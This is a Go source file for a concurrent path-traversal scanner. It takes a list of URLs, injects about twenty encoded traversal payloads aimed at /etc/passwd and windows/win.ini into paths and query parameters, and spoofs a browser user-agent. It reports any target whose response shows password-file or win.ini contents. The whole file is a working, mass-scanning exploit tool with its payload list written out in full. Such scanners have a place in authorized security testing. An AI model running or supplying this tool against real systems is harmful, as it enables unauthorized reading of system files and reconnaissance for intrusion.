package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"path"
	"strings"
	"sync"
	"time"
)

var (
	payloads = []string{
		"../../../../etc/passwd",
		"....//....//....//....//etc/passwd",
		"%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd%00",
		"..%c0%af..%ef%bc%8f..%252f..%252fetc%c0%afpasswd",
		"..%u2216..%u2216..%u2216etc%u2216passwd",
		"&#x2e;&#x2e;/&#x2e;&#x2e;/etc/&#x2f;passwd",
		"..%3b/..%3b/..%3b/etc%3b/passwd",
		"/////////////////../../../../../../../../etc/passwd",
		"../../../../../../../../../../../../../../etc/passwd",
		"//..//..//..//..//..//..//..//..//..//..//../etc/passwd",
		"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
		"../../../../../../../../../../etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
		"..%252f..%252f..%252f..%252fetc/passwd",
		"..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
		"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
		"/etc/passwd",
		"////etc/passwd",
		"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
		"/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini",
		"../../../../../../../../../../../../../../windows/win.ini",
	}

	successIndicatorLinux  = "root:x:0:0:"
	successIndicatorWindows = "[extensions]"
	userAgent              = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
	timeout                = 10 * time.Second
)

func main() {
	urlFile := flag.String("l", "", "Path to the file containing URLs")
	verbose := flag.Bool("v", false, "Enable verbose output")
	outputFile := flag.String("o", "", "Path to the output file for results")
	workers := flag.Int("w", 20, "Number of concurrent workers")
	flag.Parse()

	if *urlFile == "" {
		fmt.Println("Error: URL file is required. Use -l to specify the file.")
		flag.Usage()
		return
	}

	urls, err := readURLs(*urlFile)
	if err != nil {
		fmt.Printf("Error reading URLs: %v\n", err)
		return
	}

	client := &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	var (
		results     []string
		resultsLock sync.Mutex
		wg          sync.WaitGroup
		jobs        = make(chan string, *workers*2)
	)

	// Start worker goroutines
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for testURL := range jobs {
				vulnerable, err := checkVulnerability(client, testURL, *verbose)
				if err != nil && *verbose {
					fmt.Printf("Error checking %s: %v\n", testURL, err)
				}
				if vulnerable {
					msg := fmt.Sprintf("[VULNERABLE] %s", testURL)
					resultsLock.Lock()
					results = append(results, msg)
					resultsLock.Unlock()
					fmt.Println(msg)
				} else if *verbose {
					fmt.Printf("[SAFE] %s\n", testURL)
				}
			}
		}()
	}

	// Generate jobs
	for _, rawURL := range urls {
		testURLs := generateTestURLs(rawURL)
		for _, testURL := range testURLs {
			jobs <- testURL
		}
	}

	close(jobs)
	wg.Wait()

	if *outputFile != "" {
		err := saveResults(*outputFile, results)
		if err != nil {
			fmt.Printf("Error saving results to file: %v\n", err)
		} else if *verbose {
			fmt.Printf("Results saved to %s\n", *outputFile)
		}
	}
}

func readURLs(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var urls []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		urls = append(urls, scanner.Text())
	}
	return urls, scanner.Err()
}

func generateTestURLs(rawURL string) []string {
	u, err := url.Parse(rawURL)
	if err != nil {
		fmt.Printf("Error parsing URL %s: %v\n", rawURL, err)
		return nil
	}

	var testURLs []string

	for _, payload := range payloads {
		// Path traversal in the URL path (no encoding)
		if pathTestURL := generatePathTestURL(u, payload); pathTestURL != "" {
			testURLs = append(testURLs, pathTestURL)
		}

		// Path traversal in query parameters (no encoding)
		testURLs = append(testURLs, generateQueryTestURLs(u, payload)...)
	}

	return testURLs
}

func generatePathTestURL(u *url.URL, payload string) string {
	originalPath := u.Path
	if originalPath == "" {
		originalPath = "/"
	}

	// Remove the last segment of the path
	dirPath := path.Dir(originalPath)
	if dirPath == "." {
		dirPath = ""
	}

	// Append the raw payload to the path (no encoding)
	newPath := dirPath + "/" + payload
	newURL := *u
	newURL.Path = newPath
	newURL.RawQuery = "" // Clear query parameters
	return newURL.String()
}

func generateQueryTestURLs(u *url.URL, payload string) []string {
	query := u.Query()
	if len(query) == 0 {
		return nil
	}

	var testURLs []string

	for param := range query {
		// Manually construct the query string to avoid encoding
		newQuery := fmt.Sprintf("%s=%s", param, payload)
		newURL := *u
		newURL.RawQuery = newQuery
		testURLs = append(testURLs, newURL.String())
	}

	return testURLs
}

func checkVulnerability(client *http.Client, testURL string, verbose bool) (bool, error) {
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		return false, err
	}
	req.Header.Set("User-Agent", userAgent)

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	buf := make([]byte, 1024)
	n, _ := resp.Body.Read(buf)
	content := string(buf[:n])

	if verbose {
		fmt.Printf("Testing URL: %s\n", testURL)
		fmt.Printf("Status Code: %d\n", resp.StatusCode)
		fmt.Printf("Response Body: %s\n", content)
	}

	return strings.Contains(content, successIndicatorLinux) || strings.Contains(content, successIndicatorWindows), nil
}

func saveResults(filename string, results []string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	for _, result := range results {
		_, err := writer.WriteString(result + "\n")
		if err != nil {
			return err
		}
	}
	return writer.Flush()
}

func init() {
	flag.Usage = func() {
		fmt.Fprintf(flag.CommandLine.Output(), "Usage of %s:\n", os.Args[0])
		flag.PrintDefaults()
		fmt.Println("\nExample:")
		fmt.Println("  ./path_traversal -l urls.txt -w 100 -v -o results.txt")
	}
}
